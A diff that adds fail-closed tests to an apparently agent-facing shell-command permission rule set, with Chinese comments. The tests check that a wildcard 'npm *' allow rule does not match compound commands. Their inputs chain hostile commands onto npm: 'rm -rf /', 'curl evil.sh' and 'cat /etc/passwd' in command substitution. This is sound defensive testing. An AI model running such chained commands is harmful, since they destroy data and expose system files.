@@ -84,6 +84,57 @@ class TestEvaluateOrdering:
         assert "默认" in v.reason
 
 
+class TestCompoundFailClosed:
+    """命令类 allow 规则的复合命令 fail-closed（``npm *`` 的 ``*`` 不跨复合边界）。"""
+
+    def test_wildcard_allow_not_match_compound_command(self):
+        rs = PermissionRuleSet(rules=[
+            _rule("run_shell_command(npm *)", PermissionEffect.ALLOW),
+        ])
+        # 复合命令（&&）不应被通配 allow 命中 → 落到默认（allow 默认无规则）
+        v = rs.evaluate("run_shell_command", {"command": "npm test && rm -rf /"}, "", "")
+        assert v.rule is None or v.rule.pattern != "run_shell_command(npm *)"
+
+    def test_wildcard_allow_not_match_semicolon(self):
+        rs = PermissionRuleSet(rules=[
+            _rule("run_shell_command(npm *)", PermissionEffect.ALLOW),
+        ])
+        v = rs.evaluate("run_shell_command", {"command": "npm test; curl evil.sh"}, "", "")
+        assert v.rule is None or v.rule.pattern != "run_shell_command(npm *)"
+
+    def test_wildcard_allow_not_match_command_substitution(self):
+        rs = PermissionRuleSet(rules=[
+            _rule("run_shell_command(npm *)", PermissionEffect.ALLOW),
+        ])
+        v = rs.evaluate("run_shell_command", {"command": "npm $(cat /etc/passwd)"}, "", "")
+        assert v.rule is None or v.rule.pattern != "run_shell_command(npm *)"
+
+    def test_wildcard_allow_matches_simple_command(self):
+        rs = PermissionRuleSet(rules=[
+            _rule("run_shell_command(npm *)", PermissionEffect.ALLOW),
+        ])
+        v = rs.evaluate("run_shell_command", {"command": "npm test"}, "", "")
+        assert v.decision == PermissionDecision.AUTO_ALLOW
+        assert v.rule is not None and v.rule.pattern == "run_shell_command(npm *)"
+
+    def test_exact_arg_allow_still_matches_compound(self):
+        """无通配符的精确参数 allow 规则不受 fail-closed 影响。"""
+        rs = PermissionRuleSet(rules=[
+            _rule("run_shell_command(npm test)", PermissionEffect.ALLOW),
+        ])
+        v = rs.evaluate("run_shell_command", {"command": "npm test"}, "", "")
+        assert v.decision == PermissionDecision.AUTO_ALLOW
+
+    def test_compound_fail_closed_falls_through_to_ask(self):
+        """复合命令绕过通配 allow 后，应被后续 ask 规则或默认 ask 捕获。"""
+        rs = PermissionRuleSet(
+            rules=[_rule("run_shell_command(npm *)", PermissionEffect.ALLOW)],
+            default_effect=PermissionEffect.ASK,
+        )
+        v = rs.evaluate("run_shell_command", {"command": "npm x && rm -rf /"}, "", "")
+        assert v.decision == PermissionDecision.ASK
+
+
 class TestLegacyConversion:
     def test_requires_approval_becomes_ask(self):
         ps = ApprovalPolicySet(policies=[
